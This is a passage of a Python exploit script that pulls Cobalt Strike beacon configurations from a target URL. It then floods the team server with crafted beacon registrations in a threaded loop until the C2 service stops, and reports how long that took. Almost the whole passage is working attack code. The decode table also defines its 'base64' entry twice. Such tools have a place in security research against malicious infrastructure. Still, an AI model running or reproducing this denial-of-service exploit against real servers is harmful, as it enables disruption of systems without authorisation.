                        "mask": mask,
                        }

    func_dict_decode = {"append": lambda arg, data: data[:-len(arg)],
                        "prepend": lambda arg, data: data[len(arg):],
                        "base64": lambda arg, data: base64.b64decode(data),
                        "netbios": lambda arg, data: netbios_decode(data, 'a'),
                        "netbiosu": lambda arg, data: netbios_decode(data, 'A'),
                        "base64": lambda arg, data: base64.b64decode(data.encode('latin-1')).decode('latin-1'),
                        "base64url": lambda arg, data: base64.urlsafe_b64decode(data.encode('latin-1')).decode(
                            'latin-1').strip('='),
                        "mask": demask,
                        }
    THRESHOLD = 1100
    COLUMN_WIDTH = 35
    SUPPORTED_VERSIONS = (3, 4)
    SILENT_CONFIGS = ['PublicKey', 'ProcInject_Stub', 'smbFrameHeader', 'tcpFrameHeader', 'SpawnTo']
    HASH_ALGO = hashlib.sha256
    SIG_SIZE = HASH_ALGO().digest_size
    CS_FIXED_IV = b"abcdefghijklmnop"
    EMPTY_UA_HEADERS = {"User-Agent": ""}
    URL_PATHS = {'x86': argv_path, 'x64': argv_path} if argv_path else {'x86': 'ab2g', 'x64': 'ab2h'}
    http_method = 'https://' if 'https' in argv_url else 'http://'
    req_port = ':' + argv_url.split(':')[-1] if argv_url.count(':') == 2 else ''
    x86_beacon_conf = get_beacon_data(argv_url, 'x86')
    x64_beacon_conf = get_beacon_data(argv_url, 'x64')
    if not x86_beacon_conf and not x64_beacon_conf:
        print("[-] Failed finding any beacon configuration")
        exit()
    conf = x86_beacon_conf or x64_beacon_conf
    datas = [b'\x00\x00\x00\x03\x7f\x7f\x7f\x7f', b'\x00\x00\x00\x03\x00\x00\x00\x40',
             b'\x00\x00\x00\x03\x00\x00\x00\x20', b'\x00\x00\x00\x03\x00\x00\x00\x10',
             b'\x00\x00\x00\x03\x00\x00\x00\x06', b'\x00\x00\x00\x03\x00\x00\x00\x03',
             b'\x00\x00\x00\x03\x00\x00\x00\x01', b'\x00\x00\x00\x03\x00\x00\x70\x00',
             b'\x00\x00\x00\x03\x00\x00\x30\x00', b'\x00\x00\x00\x03\x00\x00\x10\x00',
             b'\x00\x00\x00\x03\x00\x7f\x00\x00', b'\x00\x00\x00\x03\x00\x01\x00\x00']
    lens = len(datas)
    step = 0
    check_step = 6
    print('\n[+] Send Payload')
    while True:
        threading.Thread(target=register_beacon, args=(conf, datas[step])).start()
        step = 0 if step + 1 == len(datas) else step + 1
        if step % check_step == 0:
            try:
                requests.get(argv_url, verify=False, timeout=sto + 10)
            except:
                break
    stop_times = time.time()
    print('[+] The C2 Service Has Stopped, Took %.2f Seconds' % (stop_times - start_time))
